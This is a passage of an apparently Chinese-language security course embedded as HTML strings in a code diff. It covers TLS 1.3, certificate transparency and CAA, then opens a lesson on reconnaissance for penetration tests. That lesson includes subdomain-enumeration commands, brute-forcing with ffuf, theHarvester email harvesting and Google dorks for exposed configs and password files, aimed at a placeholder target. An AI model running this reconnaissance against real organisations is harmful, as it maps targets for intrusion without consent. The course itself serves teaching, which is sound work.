密钥交换\")\n    print(\"  - 移除了静态 DH/ECDH\")\n    print(\"  - 只允许 ECDHE 和 DHE (临时密钥)\")\n\nforward_secrecy_demo()</code></pre></div>\n\n<h2>六、用 Wireshark 分析 TLS 握手</h2>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def wireshark_tls_analysis():\n    \"\"\"Wireshark 中 TLS 1.3 握手的典型捕获\"\"\"\n\n    print(\"=== Wireshark TLS 1.3 握手分析 ===\")\n    print(\"过滤器: tls.handshake.type\\n\")\n\n    packets = [\n        (\"1\", \"Client → Server\", \"ClientHello\",\n         \"version=TLS 1.2*, ciphers=[AES_256_GCM, CHACHA20], \"\n         \"key_share=[x25519], supported_versions=[1.3]\"),\n        (\"2\", \"Server → Client\", \"ServerHello\",\n         \"version=TLS 1.2*, cipher=AES_256_GCM, \"\n         \"key_share=[x25519]\"),\n        (\"3\", \"Server → Client\", \"ChangeCipherSpec\",\n         \"(兼容性，TLS 1.3 中无实际意义)\"),\n        (\"4\", \"Server → Client\", \"[Encrypted]\",\n         \"EncryptedExtensions + Certificate + \"\n         \"CertificateVerify + Finished\"),\n        (\"5\", \"Client → Server\", \"ChangeCipherSpec\",\n         \"(兼容性)\"),\n        (\"6\", \"Client → Server\", \"[Encrypted]\",\n         \"Finished\"),\n        (\"7\", \"双向\", \"Application Data\",\n         \"加密的 HTTP/2 数据\"),\n    ]\n\n    print(f\"{'#':<4} {'方向':<20} {'消息类型':<20} {'内容'}\")\n    print(\"-\" * 80)\n    for num, direction, msg_type, content in packets:\n        print(f\"{num:<4} {direction:<20} {msg_type:<20} {content}\")\n\n    print(\"\\n* TLS 1.3 的 ClientHello/ServerHello 中标记为 TLS 1.2 是\")\n    print(\"  为了兼容旧的中间设备。真正的版本号在扩展中。\")\n\n    print(\"\\n★ TLS 1.3 vs TLS 1.2 握手对比:\")\n    print(\"  TLS 1.2: ClientHello → ServerHello → Certificate →\")\n    print(\"           ServerKeyExchange → ServerDone →\")\n    print(\"           ClientKeyExchange → ChangeCipherSpec →\")\n    print(\"           Finished → (2 个往返后才能发数据)\")\n    print(\"\")\n    print(\"  TLS 1.3: ClientHello(+key_share) → ServerHello(+key_share)\")\n    print(\"           → [Encrypted: Cert + Finished] →\")\n    print(\"           [Encrypted: Finished] → (1 个往返后开始发数据)\")\n\nwireshark_tls_analysis()</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h2>七、TLS 配置最佳实践</h2>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def tls_best_practices():\n    \"\"\"TLS 服务器配置最佳实践\"\"\"\n\n    nginx_config = \"\"\"\n# Nginx TLS 1.3 最佳配置\nserver {\n    listen 443 ssl http2;\n\n    # 仅启用 TLS 1.2 和 1.3\n    ssl_protocols TLSv1.2 TLSv1.3;\n\n    # TLS 1.3 密码套件（自动选择，无需手动指定）\n    # TLS 1.2 使用强密码套件\n    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';\n\n    # 服务器优先选择密码套件\n    ssl_prefer_server_ciphers on;\n\n    # 启用 HSTS（强制 HTTPS）\n    add_header Strict-Transport-Security \"max-age=63072000\" always;\n\n    # OCSP Stapling（加速证书验证）\n    ssl_stapling on;\n    ssl_stapling_verify on;\n\n    # 会话缓存（TLS 1.2 用）\n    ssl_session_cache shared:SSL:10m;\n    ssl_session_timeout 1d;\n    ssl_session_tickets off;  # TLS 1.3 会话票据有安全隐患\n}\n\"\"\"\n    print(nginx_config)\n\n    print(\"关键配置原则:\")\n    print(\"  1. 禁用 TLS 1.0/1.1（已被 IETF 正式弃用）\")\n    print(\"  2. 仅使用 AEAD 密码套件（GCM, ChaCha20-Poly1305）\")\n    print(\"  3. 启用 HSTS 防止协议降级攻击\")\n    print(\"  4. OCSP Stapling 减少证书验证延迟\")\n    print(\"  5. 关闭 Session Tickets（可能破坏前向保密）\")\n\ntls_best_practices()</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">本节总结</div>\n<ul>\n  <li>TLS 1.3 是一次彻底的减法：移除所有不安全的算法，只保留最优选择</li>\n  <li>握手从 2-RTT 降到 1-RTT，甚至 0-RTT（预共享密钥恢复）</li>\n  <li>强制前向保密（ECDHE/DHE），历史流量不受未来密钥泄露影响</li>\n  <li>密钥通过 HKDF 层次化推导，每个阶段使用独立密钥</li>\n  <li>部署时：禁用旧版本、使用 AEAD 加密、启用 HSTS</li>\n</ul></div>\n</section>";
+
+SECTION_CONTENT["crypto-06-02"] = "<section id=\"crypto-06-02\" class=\"section\" data-key=\"crypto-06-02\">\n<div class=\"section-transition\"><p>TLS 保证了通信安全，但谁来保证证书本身是可信的？如果 CA 被入侵或者不诚实，它可以为任何域名签发证书。本节探讨证书透明和密钥固定机制——让 CA 的行为在阳光下运行。</p></div>\n<div class=\"section-header\">\n  <span class=\"chapter-tag\">crypto-06 · TLS协议</span>\n  <h1>证书透明与密钥固定</h1>\n  <p class=\"subtitle\">当信任的守护者本身不可信时，我们如何自保？</p>\n</div>\n\n<h2>一、信任危机：CA 丑闻录</h2>\n<p>PKI 体系的根本假设是 CA 值得信赖。但历史一再证明这个假设是脆弱的：</p>\n\n<h3>1.1 DigiNotar 事件（2011）</h3>\n<p>我们在上一节已经介绍过——黑客入侵 DigiNotar，伪造了 247 个证书，用于对伊朗用户实施中间人攻击。DigiNotar 被永久吊销，公司倒闭。</p>\n\n<h3>1.2 赛门铁克（Symantec）丑闻（2017）</h3>\n<p>2017 年，Google 发现 Symantec（全球最大的 CA 之一）在数年间签发了超过 <strong>30,000 个不合规证书</strong>。其中包括：</p>\n<ul>\n  <li>未经域名所有者授权就签发证书</li>\n  <li>将证书签发权限外包给不知名的第三方</li>\n  <li>签发了测试域名证书，但这些域名不属于 Symantec</li>\n</ul>\n<p>Google 最终宣布 Chrome 将逐步不信任所有 Symantec 签发的证书。Symantec 的 CA 业务以约 10 亿美元卖给了 DigiCert。</p>\n\n<h3>1.3 Trustico 事件（2018）</h3>\n<p>证书经销商 Trustico 通过邮件向 DigiCert 发送了 23,000 个客户的私钥，要求吊销这些证书。通过邮件发送私钥本身就是严重的安全违规。这些证书被紧急吊销。</p>\n\n<div class=\"callout warn\"><div class=\"callout-title\">核心问题</div><p>浏览器预装了约 150 个根 CA 的信任。这意味着这 150 个组织中的任何一个都可以为任何域名签发证书——而域名所有者可能完全不知情。如何检测和防止这种行为？</p></div>\n\n<h2>二、证书透明（Certificate Transparency）</h2>\n<p><strong>证书透明（CT）</strong>由 Google 的 Ben Laurie 设计，2013 年作为 RFC 6962 发布。核心思想：所有签发的证书必须记录在公开的、可审计的日志中。域名所有者和公众可以监控这些日志，发现可疑证书。</p>\n\n<h3>2.1 CT 的三个角色</h3>\n<ol>\n  <li><strong>日志服务器（Log）</strong>：接收并记录证书，返回签名证书时间戳（SCT）。日志是<strong>仅追加的 Merkle 树</strong>——一旦写入不可修改。</li>\n  <li><strong>监控器（Monitor）</strong>：持续检查日志中的证书，发现可疑证书时通知域名所有者。</li>\n  <li><strong>审计器（Auditor）</strong>：验证日志是否行为正确（是否包含所有承诺的证书、Merkle 证明是否有效）。</li>\n</ol>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\nimport json\n\nclass CTLogEntry:\n    \"\"\"证书透明日志条目\"\"\"\n    def __init__(self, certificate, timestamp):\n        self.certificate = certificate\n        self.timestamp = timestamp\n        self.leaf_hash = self._compute_leaf_hash()\n\n    def _compute_leaf_hash(self):\n        \"\"\"计算叶子哈希（Merkle Tree Leaf Hash）\"\"\"\n        # RFC 6962: SHA-256(0x00 || entry)\n        data = b'\\x00' + self.certificate.encode()\n        return hashlib.sha256(data).hexdigest()\n\nclass SimpleCTLog:\n    \"\"\"简化的证书透明日志实现\"\"\"\n    def __init__(self, name):\n        self.name = name\n        self.entries = []\n        self.hashes = []\n\n    def add_certificate(self, cert_data):\n        \"\"\"添加证书到日志（仅追加）\"\"\"\n        import time\n        entry = CTLogEntry(cert_data, int(time.time()))\n        self.entries.append(entry)\n        self.hashes.append(entry.leaf_hash)\n        return {\n            \"sct_version\": 1,\n            \"log_id\": hashlib.sha256(self.name.encode()).hexdigest()[:16],\n            \"timestamp\": entry.timestamp,\n            \"tree_size\": len(self.entries)\n        }\n\n    def get_root_hash(self):\n        \"\"\"计算 Merkle 树根哈希\"\"\"\n        if not self.hashes:\n            return hashlib.sha256(b'').hexdigest()\n\n        current = self.hashes.copy()\n        while len(current) > 1:\n            next_level = []\n            for i in range(0, len(current), 2):\n                if i + 1 < len(current):\n                    # RFC 6962: SHA-256(0x01 || left || right)\n                    combined = b'\\x01' + bytes.fromhex(current[i]) + bytes.fromhex(current[i+1])\n                    next_level.append(hashlib.sha256(combined).hexdigest())\n                else:\n                    next_level.append(current[i])\n            current = next_level\n        return current[0]\n\n    def get_proof(self, index):\n        \"\"\"获取某个条目的 Merkle 审计路径\"\"\"\n        proof = []\n        hashes = self.hashes.copy()\n        idx = index\n        while len(hashes) > 1:\n            sibling_idx = idx + 1 if idx % 2 == 0 else idx - 1\n            if sibling_idx < len(hashes):\n                proof.append(hashes[sibling_idx])\n            next_level = []\n            for i in range(0, len(hashes), 2):\n                if i + 1 < len(hashes):\n                    combined = b'\\x01' + bytes.fromhex(hashes[i]) + bytes.fromhex(hashes[i+1])\n                    next_level.append(hashlib.sha256(combined).hexdigest())\n                else:\n                    next_level.append(hashes[i])\n            hashes = next_level\n            idx = idx // 2\n        return proof\n\n# 模拟 CT 日志\nlog = SimpleCTLog(\"CyberEdu CT Log\")\n\n# CA 签发证书并提交到日志\ncerts = [\n    \"CN=www.example.com (签发者: Let's Encrypt)\",\n    \"CN=mail.google.com (签发者: Google Trust)\",\n    \"CN=www.example.com (签发者: 可疑CA)\",  # 可疑！\n    \"CN=bank.example.com (签发者: DigiCert)\",\n]\n\nprint(\"=== 证书透明日志 ===\\n\")\nfor cert in certs:\n    sct = log.add_certificate(cert)\n    print(f\"已记录: {cert}\")\n    print(f\"  SCT: log_id={sct['log_id']}, tree_size={sct['tree_size']}\")\n\nroot = log.get_root_hash()\nprint(f\"\\n日志根哈希: {root[:32]}...\")\nprint(f\"日志条目数: {len(log.entries)}\")\n\n# 监控器检测可疑证书\nprint(\"\\n=== 监控器扫描 ===\")\nfor i, entry in enumerate(log.entries):\n    if \"可疑\" in entry.certificate:\n        print(f\"⚠️ 发现可疑证书 (#{i}): {entry.certificate}\")\n        proof = log.get_proof(i)\n        print(f\"  Merkle 证明路径长度: {len(proof)} 个节点\")</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h3>2.2 SCT（签名证书时间戳）</h3>\n<p>当 CA 签发证书后，必须将证书提交到至少<strong>两个不同的 CT 日志</strong>，获得 SCT（Signed Certificate Timestamp）。SCT 是日志服务器的签名承诺：\"我已经在时间 T 将此证书记录在位置 N\"。</p>\n<p>SCT 可以通过三种方式传递给浏览器：</p>\n<ul>\n  <li><strong>OCSP Stapling</strong>：嵌入 OCSP 响应中</li>\n  <li><strong>TLS 扩展</strong>：在 TLS 握手中直接传递</li>\n  <li><strong>证书嵌入</strong>：直接写入证书扩展字段</li>\n</ul>\n\n<h3>2.3 Chrome 的 CT 强制要求</h3>\n<p>2018 年起，Chrome 要求所有新签发的证书必须有 SCT。没有 SCT 的证书将被 Chrome 拒绝。Apple 的 Safari 也跟进实施了类似要求。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def ct_verification_flow():\n    \"\"\"证书透明的完整验证流程\"\"\"\n\n    print(\"=== CT 验证流程 ===\\n\")\n\n    print(\"1. CA 签发证书\")\n    print(\"   CA → 签发 www.example.com 的证书\\n\")\n\n    print(\"2. CA 提交到 CT 日志\")\n    print(\"   CA → Log1 (Google Argon) → 获得 SCT1\")\n    print(\"   CA → Log2 (Cloudflare Nimbus) → 获得 SCT2\")\n    print(\"   要求: 至少 2 个独立日志，且一个由 Google 运营\\n\")\n\n    print(\"3. SCT 附加到证书\")\n    print(\"   方式 A: 嵌入 OCSP 响应 (最常见)\")\n    print(\"   方式 B: TLS 扩展 (较少用)\")\n    print(\"   方式 C: 写入证书本身 (预证书)\\n\")\n\n    print(\"4. 浏览器验证\")\n    print(\"   a. 收到证书 + SCT\")\n    print(\"   b. 验证 SCT 签名（来自已知日志服务器）\")\n    print(\"   c. 检查 SCT 时间戳在证书有效期内\")\n    print(\"   d. 检查 SCT 数量满足策略要求\")\n    print(\"   → 全部通过 → 信任证书 ✓\\n\")\n\n    print(\"5. 域名所有者监控\")\n    print(\"   定期扫描 CT 日志中所有包含自己域名的证书\")\n    print(\"   发现未经授权的证书 → 立即报告 CA/Browser Forum\")\n\nct_verification_flow()</code></pre></div>\n\n<h2>三、查询真实 CT 日志</h2>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import json\n\ndef query_ct_logs():\n    \"\"\"展示如何查询 crt.sh（公开的 CT 日志搜索引擎）\"\"\"\n\n    print(\"=== 查询 crt.sh CT 日志 ===\\n\")\n    print(\"crt.sh 是最大的 CT 日志搜索引擎，可以搜索任何域名的证书\\n\")\n\n    # 模拟 crt.sh API 响应\n    mock_results = [\n        {\n            \"id\": 12345678901,\n            \"entry_timestamp\": \"2024-03-15T10:30:00\",\n            \"common_name\": \"www.example.com\",\n            \"issuer_name\": \"Let's Encrypt Authority X3\",\n            \"not_before\": \"2024-03-15\",\n            \"not_after\": \"2024-06-13\"\n        },\n        {\n            \"id\": 12345678902,\n            \"entry_timestamp\": \"2024-03-10T08:15:00\",\n            \"common_name\": \"*.example.com\",\n            \"issuer_name\": \"DigiCert SHA2 Extended Validation\",\n            \"not_before\": \"2024-03-10\",\n            \"not_after\": \"2025-03-10\"\n        },\n    ]\n\n    print(\"搜索: example.com\")\n    print(f\"{'ID':<15} {'签发时间':<22} {'域名':<25} {'签发者':<40}\")\n    print(\"-\" * 100)\n    for r in mock_results:\n        print(f\"{r['id']:<15} {r['entry_timestamp']:<22} \"\n              f\"{r['common_name']:<25} {r['issuer_name']:<40}\")\n\n    print(\"\\n实际查询 URL:\")\n    print(\"  https://crt.sh/?q=example.com&output=json\")\n    print(\"\\n安全团队应定期自动化检查:\")\n    print(\"  1. 是否有未授权的证书签发\")\n    print(\"  2. 是否有可疑 CA 签发的证书\")\n    print(\"  3. 通配符证书是否覆盖范围过大\")\n\nquery_ct_logs()</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h2>四、密钥固定（HPKP）：已死的防御</h2>\n<p><strong>HTTP Public Key Pinning（HPKP）</strong>允许网站在 HTTP 头中声明\"只有这些公钥签发的证书才是合法的\"。理论上完美，实践中却成了灾难。</p>\n\n<h3>4.1 HPKP 的工作原理</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\nimport base64\n\ndef hpkp_demo():\n    \"\"\"HPKP 头部示例（已弃用！）\"\"\"\n\n    print(\"=== HPKP (HTTP Public Key Pinning) ===\\n\")\n\n    # 模拟公钥哈希计算\n    # 实际是 SubjectPublicKeyInfo 的 SHA-256 哈希\n    fake_pubkey_1 = b\"server_public_key_primary_2024\"\n    fake_pubkey_2 = b\"server_public_key_backup_2024\"\n\n    pin1 = base64.b64encode(hashlib.sha256(fake_pubkey_1).digest()).decode()\n    pin2 = base64.b64encode(hashlib.sha256(fake_pubkey_2).digest()).decode()\n\n    print(\"HTTP 响应头:\")\n    print(f'  Public-Key-Pins: pin-sha256=\"{pin1}\";')\n    print(f'    pin-sha256=\"{pin2}\";')\n    print(f'    max-age=2592000; includeSubDomains\\n')\n\n    print(\"含义: 在未来 30 天内，浏览器只接受由这两个公钥之一\")\n    print(\"      签发的证书来访问此网站\\n\")\n\n    print(\"⚠️ HPKP 的致命问题:\")\n    print(\"  1. 操作风险: 如果你丢失了备份密钥，且 pin 还没过期，\")\n    print(\"     所有访问者（包括已缓存 pin 的）将永远无法访问!\")\n    print(\"  2. 自锁攻击: 攻击者获取一个受信任 CA 签发的证书，\")\n    print(\"     设置只 pin 攻击者控制的密钥 → 网站被永久锁定\")\n    print(\"  3. 与证书轮换冲突: Let's Encrypt 每 90 天更换证书，\")\n    print(\"     pin 需要频繁更新\")\n\nhpkp_demo()</code></pre></div>\n\n<h3>4.2 HPKP 的死亡</h3>\n<p>由于操作风险太高，Chrome 在 2018 年（版本 67）完全移除了 HPKP 支持。Firefox 也在同一时期移除。HPKP 是密码学中\"理论上正确但实践中失败\"的典型案例。</p>\n\n<div class=\"callout default\"><div class=\"callout-title\">密码学教训</div><p>HPKP 的失败说明：安全机制不仅要数学上正确，还要在运维上可行。一个需要完美操作的防御方案，在现实世界中往往弊大于利。</p></div>\n\n<h2>五、替代方案：Expect-CT 和 CAA</h2>\n\n<h3>5.1 Expect-CT</h3>\n<p><strong>Expect-CT</strong> 是 HPKP 的\"温和\"替代品。它不限制哪些公钥可以使用，而是告诉浏览器\"请检查这个域名的证书是否记录在 CT 日志中\"。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def expect_ct_demo():\n    \"\"\"Expect-CT 头部\"\"\"\n\n    print(\"=== Expect-CT ===\\n\")\n\n    print(\"HTTP 响应头:\")\n    print('  Expect-CT: max-age=86400, enforce,')\n    print('    report-uri=\"https://example.report-uri.com/r/d/ct/reportOnly\"\\n')\n\n    print(\"含义:\")\n    print(\"  - max-age=86400: 24 小时内浏览器应检查 CT 合规性\")\n    print(\"  - enforce: 如果证书不在 CT 日志中，拒绝连接\")\n    print(\"  - report-uri: 将违规报告发送到指定 URL\\n\")\n\n    print(\"优势（相比 HPKP）:\")\n    print(\"  1. 不会自锁: 不限制特定公钥\")\n    print(\"  2. 可与 Let's Encrypt 配合: 自动满足 CT 要求\")\n    print(\"  3. 渐进式部署: 先 report-only 模式，再 enforce\")\n\nexpect_ct_demo()</code></pre></div>\n\n<h3>5.2 CAA（Certificate Authority Authorization）</h3>\n<p><strong>CAA</strong> 让域名所有者在 DNS 中声明\"只有这些 CA 可以为我的域名签发证书\"。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def caa_demo():\n    \"\"\"CAA DNS 记录\"\"\"\n\n    print(\"=== CAA (Certificate Authority Authorization) ===\\n\")\n\n    print(\"DNS CAA 记录示例:\")\n    print(\"  example.com.  IN  CAA  0 issue \\\"letsencrypt.org\\\"\")\n    print(\"  example.com.  IN  CAA  0 issue \\\"digicert.com\\\"\")\n    print(\"  example.com.  IN  CAA  0 issuewild \\\";\\\"\")\n    print(\"  example.com.  IN  CAA  0 iodef \\\"mailto:security@example.com\\\"\\n\")\n\n    print(\"含义:\")\n    print(\"  - issue: 只有 Let's Encrypt 和 DigiCert 可以签发证书\")\n    print(\"  - issuewild ';': 禁止任何 CA 签发通配符证书\")\n    print(\"  - iodef: 违规签发时通知此邮箱\\n\")\n\n    print(\"工作流程:\")\n    print(\"  1. CA 收到证书申请 (example.com)\")\n    print(\"  2. CA 查询 DNS CAA 记录\")\n    print(\"  3. 检查自己是否在允许的 CA 列表中\")\n    print(\"  4. 不在列表中 → 拒绝签发!\")\n    print(\"  5. 在列表中 → 正常签发\")\n\ncaa_demo()</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h2>六、完整的证书安全防御体系</h2>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def certificate_security_layers():\n    \"\"\"证书安全的完整防御层次\"\"\"\n\n    print(\"=\" * 60)\n    print(\"证书安全：多层防御体系\")\n    print(\"=\" * 60)\n\n    layers = [\n        (\"第1层\", \"PKI 层次结构\",\n         \"根 CA → 中间 CA → 终端证书\\n\"\n         \"浏览器预装信任锚，逐层验证签名\"),\n        (\"第2层\", \"证书透明 (CT)\",\n         \"所有证书必须记录在公开 Merkle 日志中\\n\"\n         \"域名所有者可以监控未经授权的签发\"),\n        (\"第3层\", \"OCSP Stapling\",\n         \"实时检查证书是否被吊销\\n\"\n         \"服务器缓存 OCSP 响应减少延迟\"),\n        (\"第4层\", \"HSTS\",\n         \"强制浏览器只通过 HTTPS 连接\\n\"\n         \"防止 SSL Strip 降级攻击\"),\n        (\"第5层\", \"Expect-CT\",\n         \"确保浏览器验证 CT 合规性\\n\"\n         \"未记录在 CT 日志中的证书被拒绝\"),\n        (\"第6层\", \"CAA DNS 记录\",\n         \"限制哪些 CA 可以为域名签发证书\\n\"\n         \"减少被不诚实 CA 签发伪造证书的风险\"),\n        (\"第7层\", \"证书监控\",\n         \"自动化扫描 crt.sh 等 CT 搜索引擎\\n\"\n         \"及时发现可疑证书并报告\"),\n    ]\n\n    for layer_num, name, desc in layers:\n        print(f\"\\n{layer_num}: {name}\")\n        print(\"-\" * 40)\n        for line in desc.split(\"\\n\"):\n            print(f\"  {line}\")\n\n    print(\"\\n\" + \"=\" * 60)\n    print(\"部署建议:\")\n    print(\"=\" * 60)\n    print(\"  ✓ 使用 Let's Encrypt (免费、自动 CT 提交)\")\n    print(\"  ✓ 启用 HSTS (Strict-Transport-Security)\")\n    print(\"  ✓ 配置 CAA DNS 记录\")\n    print(\"  ✓ 设置 CT 日志监控 (crt.sh API)\")\n    print(\"  ✓ 启用 OCSP Stapling\")\n    print(\"  ✗ 不要使用 HPKP (已弃用、有自锁风险)\")\n\ncertificate_security_layers()</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">本节总结</div>\n<ul>\n  <li>CA 丑闻（DigiNotar、Symantec）暴露了 PKI 信任模型的根本弱点</li>\n  <li>证书透明（CT）要求所有证书记录在公开的 Merkle 树日志中，可被任何人审计</li>\n  <li>SCT（签名证书时间戳）证明证书已被 CT 日志收录</li>\n  <li>HPKP（密钥固定）因操作风险过高被所有浏览器弃用</li>\n  <li>替代方案：Expect-CT（强制 CT 检查）+ CAA（限制授权 CA）</li>\n  <li>完整防御需要多层机制协同：PKI + CT + HSTS + CAA + 监控</li>\n</ul></div>\n</section>";
+
+SECTION_CONTENT["pentest-01-01"] = "<div class=\"section-transition\"><p>Web 安全模块让我们掌握了各种注入和绕过技术。现在我们将这些技术整合到一个完整的渗透测试流程中——从信息收集开始，一步步走向目标系统的完全控制。</p></div>\n\n<h1>侦察方法论：你的渗透测试从这里开始</h1>\n\n<p>想象一下这个场景：你刚接到一个渗透测试项目，客户给了你一个域名 <code>targetcorp.com</code> 和一份授权书。你盯着屏幕，手指悬在键盘上方——接下来该做什么？</p>\n\n<p>很多新手会直接打开 nmap 开始扫描，这是一个常见的错误。<strong>优秀的渗透测试员和脚本小子的区别，就在于信息收集的深度和系统性。</strong>在真实的攻防对抗中，80% 的时间都花在侦察阶段——因为你知道得越多，攻击面就越清晰，成功率就越高。</p>\n\n<h2>渗透测试方法论框架</h2>\n\n<p>在我们开始敲命令之前，先建立一个系统化的思维框架。业界有几个主流的渗透测试方法论：</p>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">PTES（渗透测试执行标准）</div>\n<p>PTES 将渗透测试分为 7 个阶段：前期交互、情报收集、威胁建模、漏洞分析、漏洞利用、后渗透、报告。我们这一节聚焦在情报收集阶段，这是整个测试的基石。</p>\n</div>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">OWASP 测试指南</div>\n<p>OWASP Testing Guide v4.2 提供了详细的信息收集检查清单，包括指纹识别、搜索引擎发现、应用入口映射等。在做 Web 渗透时，OWASP 的框架特别实用。</p>\n</div>\n\n<p>不管你选择哪个框架，核心思想都是一样的：<strong>先广后深，先被动后主动</strong>。我们先通过被动方式（不直接接触目标）获取信息，然后再用主动扫描来补充细节。</p>\n\n<h2>被动侦察：不留痕迹的信息收集</h2>\n\n<p>被动侦察的魅力在于——目标完全不知道你在看他。你不直接连接目标的服务器，而是通过各种公开渠道收集信息。</p>\n\n<h3>OSINT（开源情报）收集</h3>\n\n<p>OSINT 是 Open Source Intelligence 的缩写。听起来很高大上，其实就是\"从公开来源搜集情报\"。对于渗透测试来说，OSINT 是你最重要的技能之一。</p>\n\n<h4>1. 域名与 WHOIS 信息</h4>\n\n<p>一切从域名开始。WHOIS 查询可以告诉你域名的注册信息：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">$ whois targetcorp.com\n\nDomain Name: TARGETCORP.COM\nRegistry Domain ID: 2638475921_DOMAIN_COM-VRSN\nRegistrar: GoDaddy.com, LLC\nRegistrar IANA ID: 146\nUpdated Date: 2024-03-15T08:22:10Z\nCreation Date: 2021-09-01T14:30:00Z\nName Server: ns1.targetcorp.com\nName Server: ns2.targetcorp.com\nRegistrant Organization: Target Corporation\nRegistrant State/Province: Beijing\nRegistrant Country: CN\nRegistrant Email: admin@targetcorp.com\n...</code></pre></div>\n\n<p>从 WHOIS 结果中，我们提取到关键信息：注册邮箱 <code>admin@targetcorp.com</code>（可能是一个有效的用户名）、名称服务器（自建的，暗示有独立的基础设施）、注册商（GoDaddy）。</p>\n\n<h4>2. 子域名枚举</h4>\n\n<p>子域名是渗透测试的金矿。主站可能防护严密，但子域名往往是薄弱环节。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">$ subfinder -d targetcorp.com -silent\n\nwww.targetcorp.com\nmail.targetcorp.com\napi.targetcorp.com\ndev.targetcorp.com\nadmin.targetcorp.com\nstaging.targetcorp.com\nvpn.targetcorp.com\nblog.targetcorp.com\ngit.targetcorp.com\njira.targetcorp.com</code></pre></div>\n\n<p>看看发现了什么！<code>dev.targetcorp.com</code>、<code>staging.targetcorp.com</code>、<code>admin.targetcorp.com</code>——这些子系统的安全防护通常比生产环境弱得多。<code>git.targetcorp.com</code> 可能暴露源代码，<code>jira.targetcorp.com</code> 可能泄露内部项目信息。</p>\n\n<p>我们还可以用多个工具交叉验证：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 amass 进行更深度的枚举\n$ amass enum -passive -d targetcorp.com -o amass_results.txt\n\n# 使用 crt.sh 查询 SSL 证书透明度日志\n$ curl -s \"https://crt.sh/?q=targetcorp.com&output=json\" | jq '.[].name_value' | sort -u\n\n# 使用 DNS 暴力破解\n$ ffuf -u \"https://FUZZ.targetcorp.com\" -w /usr/share/wordlists/subdomains.txt -mc 200,301,302</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">注意</div>\n<p>被动侦察使用公开信息源，不会触发目标的安全告警。但 DNS 暴力破解（ffuf 那步）是主动行为，会被 DNS 服务器记录。区分好被动和主动的边界非常重要。</p>\n</div>\n\n<h4>3. 搜索引擎情报（Google Hacking）</h4>\n\n<p>Google 是最强大的 OSINT 工具之一。通过特定的搜索语法（Google Dorks），你可以找到目标意外暴露的敏感信息：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 查找暴露的目录列表\nsite:targetcorp.com intitle:\"index of /\"\n\n# 查找配置文件\nsite:targetcorp.com ext:xml OR ext:conf OR ext:cnf OR ext:reg OR ext:inf\n\n# 查找登录页面\nsite:targetcorp.com inurl:login OR inurl:admin OR inurl:portal\n\n# 查找暴露的数据库信息\nsite:targetcorp.com ext:sql OR ext:dbf OR ext:mdb\n\n# 查找文档中的敏感信息\nsite:targetcorp.com ext:docx OR ext:xlsx OR ext:pdf \"confidential\" OR \"password\"</code></pre></div>\n\n<div class=\"callout success\">\n<div class=\"callout-title\">实战经验</div>\n<p>在一次真实的渗透测试中，我们通过 Google Dork 找到了目标公司一份未加密的 Excel 文件，里面包含了内部 VPN 的配置信息和默认密码。这就是被动侦察的威力——不碰目标一个字节，就已经拿到了关键信息。</p>\n</div>\n\n<h4>4. 社交媒体与人员情报</h4>\n\n<p>人是最薄弱的环节。通过 LinkedIn、微博、招聘网站等渠道，你可以获取：</p>\n\n<ul>\n<li><strong>技术栈信息</strong>：招聘信息中经常写着\"熟悉 Apache/Nginx/Tomcat\"、\"掌握 Python/Java\"——这些直接暴露了目标的技术架构</li>\n<li><strong>组织架构</strong>：LinkedIn 可以帮你画出目标公司的 IT 部门结构</li>\n<li><strong>邮箱格式</strong>：通过已知员工推断邮箱命名规则（如 firstname.lastname@company.com）</li>\n<li><strong>内部照片</strong>：办公环境照片可能暴露白板上的架构图、屏幕上的代码</li>\n</ul>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 theHarvester 自动收集邮箱和子域名\n$ theHarvester -d targetcorp.com -b all\n\n[*] Target: targetcorp.com\n[*] Searching Google...\n[*] Searching Bing...\n[*] Searching LinkedIn...\n\n[+] Emails found:\n  - zhang.wei@targetcorp.com\n  - li.ming@targetcorp.com\n  - it-support@targetcorp.com\n  - hr@targetcorp.com\n\n[+] Hosts found:\n  - 192.168.1.10:mail.targetcorp.com\n  - 203.0.113.50:www.targetcorp.com</code></pre></div>\n\n<h3>技术指纹识别</h3>\n\n<p>了解目标使用了什么技术，是制定攻击策略的基础：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 whatweb 识别 Web 技术栈\n$ whatweb -v https://www.targetcorp.com\n\nWhatWeb report for https://www.targetcorp.com\nStatus    : 200 OK\nTitle     : Target Corporation - Home\nIP        : 203.0.113.50\nCountry   : CN, China\n\nDetected Plugins:\n[ Apache ]\n  Version      : 2.4.52\n  String       : 